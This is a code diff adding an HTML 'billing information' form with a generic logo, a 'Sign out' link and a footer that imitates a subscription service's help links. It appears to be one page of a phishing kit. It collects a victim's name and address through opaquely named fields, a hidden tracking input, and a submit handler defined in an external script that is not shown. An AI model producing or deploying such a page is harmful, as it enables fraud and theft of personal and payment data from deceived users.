@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Information</title>
+    <link rel="stylesheet" href="./css/11.css">
+    <link rel="stylesheet" href="./css/12.css">
+</head>
+<body style="background:white !important;">
+
+
+<header>
+    <div class="left">
+        <img src="./img/lg.png">
+    </div>
+    <div class="right">
+        <a href="#">Sign out</a>
+    </div>
+</header>
+
+<section style="text-align:center;">
+    <div class="form" id="card" style="text-align:left;">
+        <input type="hidden" id="1" value="unkown">
+
+        <div class="form-title" style="font-size:2em; font-weight:bold; color:#333;">
+            Enter your billing information
+        </div>
+
+        <div class="form-col">
+
+        </div>
+
+        <div class="form-col">
+            <input type="text" class="textinput" placeholder="Full Name" id="d1" required>
+        </div>
+
+        <div class="form-col">
+            <input type="text" class="textinput" placeholder="Street Address" id="d2" required>
+        </div>
+
+        <div class="form-col multi">
+            <div class="left">
+                <input type="text" class="textinput" placeholder="City" name="d3" id="d3" required>
+            </div>
+            <div class="right">
+                <input type="text" class="textinput" placeholder="ZIP / Postal Code" name="d4" id="d4" required>
+            </div>
+        </div>
+
+        <div class="form-col multi">
+            <div class="left">
+                <input type="text" class="textinput" placeholder="State / Province" name="d5" id="d5" required>
+            </div>
+            <div class="right">
+                <input type="text" class="textinput" placeholder="Country" name="d6" id="d6" required>
+            </div>
+        </div>
+
+        <div class="form-col link" style="color:#848484; font-size:0.8em;">
+            <p>
+                By clicking the “Submit” button below, you confirm that the billing information is correct. Your payment will be processed securely and used for account charges where applicable.
+            </p>
+        </div>
+
+        <div class="form-col">
+            <button type="submit" onclick="submitFormIfNecessary()">Submit</button>
+        </div>
+    </div>
+</section>
+
+<footer>
+<div class="footer-holder">
+    <h3>Questions? Contact us.</h3>
+    <span>FAQ</span>
+    <span>Help Center</span>
+    <span>Terms of Use</span> 
+    <span>Privacy</span>
+    <span>Cookie Preferences</span>
+    <span>Corporate Information</span>
+</div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert@2.1.2/dist/sweetalert.min.js"></script>
+<script src="common/1215.js"></script>
+
+<script>
+
+
+var allowSubmit;
+var abortVal = true;
+
+function validate(){
+    abortVal=false;
+    allowSubmit=true;
+
+    $("input").removeClass("error");
+
+    if($("#d1").val().length<2){
+        $("#d1").addClass("error");
+        allowSubmit=false;
+    }
+
+    if($("#d2").val().length<5){
+        $("#d2").addClass("error");
+        allowSubmit=false;
+    }
+
+    if($("#d3").val().length<2){
+        $("#d3").addClass("error");
+        allowSubmit=false;
+    }
+}
+
+
+
+</script>
+
+</body>
+</html>
